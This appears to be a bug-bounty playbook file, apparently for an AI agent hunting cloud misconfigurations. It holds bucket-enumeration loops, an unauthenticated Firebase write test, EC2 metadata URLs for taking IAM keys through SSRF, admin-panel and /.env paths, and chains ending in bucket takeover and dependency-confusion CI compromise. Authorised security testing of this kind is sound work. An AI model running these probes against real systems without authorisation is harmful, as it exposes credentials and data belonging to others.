description: "Hunt cloud / infrastructure misconfigurations. AWS: public S3 buckets (s3:GetObject anonymous), permissive bucket policies (PutObjectAcl public-write), exposed CloudFront origin, public Lambda function URL, public RDS snapshot, IAM credentials in JS bundles, AWS metadata accessible via SSRF. GCP: public GCS buckets, exposed Cloud Run services, leaked service account JSON. Azure: public blob containers, exposed Function App. K8s: kubelet 10250 unauth, etcd 2379, dashboard public, services API public, pod metadata service. CI/CD: Jenkins /script console, GitLab Runner registration token, GitHub Actions workflow with pull_request_target injection. Container: Docker daemon 2375, Kubernetes API anonymous. Detection: targeted dorking, certificate transparency, JS bundle secret extraction, port scan for known service ports. Validate: actual data read / write / RCE. Use when hunting cloud-native attack surface."

## 16. CLOUD / INFRA MISCONFIGS

### S3 / GCS / Azure Blob
```bash
# S3 listing
curl -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common bucket names
for name in target target-backup target-assets target-prod target-staging; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl -s "https://TARGET-APP.firebaseio.com/.json"   # read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
```

### EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
```

### Exposed Admin Panels
```
/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
```

## Local-verification toolchain

For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:

```bash
# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0

# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
```

Without those env vars, `aws s3 cp/sync` fails with `InvalidRequest`. Document this for the team. See `docs/verification/phase2j-cloud-localstack.md` for the full reproducible flow.

## Related Skills & Chains

- **`hunt-subdomain`** — Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `hunt-subdomain` → unclaimed CNAME points to bucket → `assets.target.com` takeover.
- **`cloud-iam-deep`** — A leaked SA JSON / AWS key in a public bucket is only half the bug. Chain primitive: Public S3 + leaked AWS key in `.env` → `cloud-iam-deep` enumeration → cross-service `iam:PassRole` escalation.
- **`hunt-ssrf`** — Metadata service is reachable only from inside the VPC; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) → instance role keys → S3/RDS data read.
- **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
- **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
- **`triage-validation`** — Apply the Unique-Marker gate: any "writable bucket" claim requires a write of a unique marker file and a read-back from a clean session before report submission.
